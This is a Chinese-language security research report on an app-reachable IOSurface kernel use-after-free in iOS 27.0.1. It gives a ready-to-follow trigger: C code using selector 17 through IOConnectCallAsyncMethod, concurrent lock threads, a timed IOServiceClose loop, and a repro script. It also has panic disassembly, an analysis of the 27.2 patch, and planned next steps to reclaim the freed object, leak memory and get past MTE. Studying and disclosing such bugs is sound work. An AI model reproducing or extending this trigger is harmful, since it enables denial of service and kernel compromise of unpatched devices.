# 研究报告：iOS 27.0.1 上 app 可达的 IOSurface 内核 UAF

> 环境：iPhone 17 Pro Max（iPhone18,2）/ iOS 27.0.1 (24A446) / xnu-13432.2.10
> 入口：**无任何 entitlement 的普通 app**
> 证据：真机 4/4 复现，同一指令，跨 4 次独立启动 / 4 个 KASLR slide / 4 个 CPU
> 源码：`harness/israce/main.panic.m`（从会话记录逐字恢复，2026-11-01 12:09:58 版）

---

## 1. 一句话

`IOSurfaceRoot` 的内核用户客户端在**用 selector 17 把一个 surface 注册进 root 的注册表**之后，
若该 surface 被释放而注册表节点没有被摘除，节点里的 `owner` 指针就悬空；
此后任何一次遍历注册表的操作（例如另一个连接的 `IOServiceClose` 触发的 teardown）
都会解引用这个已释放对象 —— **内核内存标记（MTE）当场判定 use-after-free 并 panic**。

---

## 2. 触发方法（可直接照做）

### 2.1 前置

- 任意 iOS 27.0.1 设备
- 一个 app（dev 签名即可，**不需要 `com.apple.private.*`**）
- 链接 `IOKit.framework` + `CoreFoundation` + `IOSurface`（`dlopen` 也行）

### 2.2 最小步骤

```c
// 0) 拿服务
io_service_t svc = /* IOServiceGetMatchingServices("IOSurfaceRoot") 的第一个对象 */;

// 1) 建立连接
io_connect_t c = 0;
IOServiceOpen(svc, mach_task_self(), 0, &c);

// 2) 建一个 wake port（async 调用的通知端口，必须有）
mach_port_t wp = MACH_PORT_NULL;
mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);

// 3) ★ 注册 —— 必须用 ASYNC 接口，同步恒失败
uint64_t in[3] = { 1, 2, 3 };
uint64_t ref   = 0x1122334455667788ull;   // reference token，内核会存进节点
uint32_t soc   = 0;
kern_return_t r = IOConnectCallAsyncMethod(
        c,              /* 连接 */
        17,             /* selector = 注册 */
        wp,             /* wake port */
        &ref, 1,        /* reference 数组：count=1, 指针非 0  ← 关键 */
        NULL, 0,        /* scalar 输入 */
        in, 24,         /* struct 输入，24 字节 */
        NULL, &soc,     /* scalar 输出 */
        NULL, NULL);    // 期望 r == KERN_SUCCESS

// 4) 建一个 surface（尺寸走默认 size class，64x4 BGRA）
IOSurfaceRef s = IOSurfaceCreate(@{ @"IOSurfaceWidth":@64, @"IOSurfaceHeight":@4,
                                    @"IOSurfaceBytesPerElement":@4,
                                    @"IOSurfacePixelFormat":@0x42475241 });

// 5) 4 个线程并发 lock/unlock 制造压力
//    while (run) { IOSurfaceLock(s,0,&seed); IOSurfaceUnlock(s,0,&seed); }

// 6) 微秒级延时后关闭连接 —— teardown 从这里进
usleep(200 + (iter % 40) * 25);
IOServiceClose(c);          // ★ 崩溃点：第 100 次迭代在此炸

// 7) 收尾
usleep(300);
// 停线程、join
CFRelease(s);
mach_port_mod_refs(mach_task_self(), wp, MACH_PORT_RIGHT_RECEIVE, -1);
```

**把 1–7 放进一个循环反复跑**（恢复件用的是 200 次），实测在**第 100 次**命中。

### 2.3 三个非显然的必要条件

| # | 条件 | 为什么 |
|---|---|---|
| 1 | **必须 `IOConnectCallAsyncMethod`** | selector 17 的 handler 是 `ldr x1,[args+0x10]; cbz x1 -> kIOReturnBadArgument`。`args+0x10` 是 reference 数组指针，**只有 async 路径会填**。同步调用恒为 0 ⇒ 恒 `0xE00002C2`。实测同步 4 种形态全部 BadArgument |
| 2 | **`refCnt = 1` 且 `ref` 非 0** | `shape=3`（`refCnt=0`）打不通；`shape=1`（`ref=0x1122334455667788`）与 `shape=2`（`ref=0`）都能注册成功 |
| 3 | **`IOServiceClose` 要比 `CFRelease(surface)` 先** | UAF 是「节点悬空 → teardown 遍历时炸」。先关连接，surface 才在后续迭代里成为别人的目标 |

`in[3] = {1,2,3}` 是 `#799` 的 arg 契约解出来的：`init(node+0x10, *reference, in[0], in[1])` 纯标量写入，
`node+0x50 = in[2]`，`node+0x58 = self`（即 owner），然后头插入 `root+0x188` / `root+0x190`。

---

## 3. 崩溃现场（4/4 同点）

| # | 时间 | slide | pc（静态） | lr（静态） | CPU |
|---|---|---|---|---|---|
| 1 | 12:11:05 | `0x3e48c000` | `0xfffffe000a34ff88` | `0xa346338` | 0 |
| 2 | 12:12:03 | `0x2eb20000` | `0xfffffe000a34ff88` | `0xa346338` | 3 |
| 3 | 12:16:22 | `0x4686c000` | `0xfffffe000a34ff88` | `0xa346338` | 1 |
| 4 | 12:17:54 | `0x2f420000` | `0xfffffe000a34ff88` | `0xa346338` | 0 |

panic 类型：`Kernel tag check fault`（`0xfffffe000a34ff88` 落在 `com.apple.iokit.IOSurface` 内）

```
0xa3462f0  bti c                          ; 遍历注册表 root+0x188
0xa34631c  ldr x22,[x20,#0x188]           ; head
0xa346324  ldr x0,[x22,#0x58]             ; node->owner  ← 已释放的 surface
0xa346334  bl  0xa34ff4c                  ; lr = 0xa346338（4/4 一致）
0xa34ff88  ldr x0,[x0,#0xd8]              ; ★ 取 owner 的锁 → tag 失配
```

**算术自证**：panic 报 `x0 = 0xf1fffe327a877480`，去标签 `0xfffffe327a877480`，
`+0xd8 = 0xfffffe327a877558`，而「expected tagged address」= `0xfcfffe327a877558`。
**偏移精确等于指令立即数，只有 tag 不同（0xf1 vs 0xfc）** ⇒ 对象在 free 时被重新打标。

**精确定位到单个用例**：`out/israce.ndjson` 里 `begin` 无 `end` 的 key 只有一个 ——
`lockdeg-N1-I0100`，t=0.178，前一条 I0099 正常收尾。

---

## 4. Apple 在 27.2 怎么修的（反证这是真洞）

| 位置 | 27.2 的改动 |
|---|---|
| `#802`（注销） | 锁内加 `mov w8,#1; strb w8,[self,#0xf1]` —— 打「已注销」粘滞标记 |
| `#799`（注册） | 锁内加 `ldrb w8,[self,#0xf1]; tbz` → 否则返回 `kIOReturnNotAttached (0xE00002D8)` |
| `#802` 位置 | 从 teardown **末尾提到最前** |

**`+0xf1` 的全 cache 访问数：27.0.1 = 0，27.2 = 2。**

⇒ 27.0.1 在「清 `+0xf0`（已挂进注册表）」与「摘链」之间夹了两次函数调用，
窗口由此而来；27.2 用一个粘滞位把这个窗口彻底关死。

---

## 5. 当前能做什么、不能做什么

### 已确证

- **确定性内核 UAF**，无特权入口，4/4 复现，单点指令
- 触发只需 Mach/IOSurface 公开 API，不需要私有 entitlement
- 崩溃是可控的「靶向 panic」，不是随机崩

### 尚未做到（这是继续的门槛）

1. **对象不可控** —— 现在只会 panic。要在 free 与 teardown 之间用**同 size class** 的
   `IOSurfaceCreate` 抢占那块内存，让 `node->owner` 指向我们布置的内容
2. **没有转成泄漏** —— `owner+0xd8` 被当作锁指针读；若能让 owner 指向受控内存，
   读出的值就是可控地址上的内容
3. **MTE 会挡住粗糙的利用** —— 内核内存标记让「指针换对象」变成 tag 失配，
   必须先解决 tag 一致性（要么同 tag 的再分配，要么找到不打标的路径）

---

## 6. 方法论上值得留下的三条

1. **selector 的 arg 契约必须从 handler 反汇编读**，不能按 `IOConnectCallMethod` 的常规签名猜。
   `args+0x10`（reference 数组）只存在于 async 路径，猜错就得到「恒 BadArgument」的假死结论。
2. **「同步打不通」≠「不可达」** —— 本项目曾因这条把整条线判死。
3. **源码迭代必须只新建不覆盖**（见 `out/RULES.md` R1）。
   这个已经验证过的内核 UAF 就曾因一次覆盖而丢失三天，靠翻会话 JSON 才逐字找回。

---

## 7. 复现清单

```bash
cp harness/israce/main.panic.m harness/israce/main.v5.m   # 不要覆盖 main.m
# 按 out/RULES.md R1 的流程编辑 main.v5.m，装之前再同步到 main.m
bash harness/israce/run.sh
# 判据：out/israce.ndjson 里出现「有 begin 无 end」的 lockdeg-N1-I* 即命中
# panic 归档后反推 pc：static = pc_runtime - slide，应等于 0xfffffe000a34ff88
```
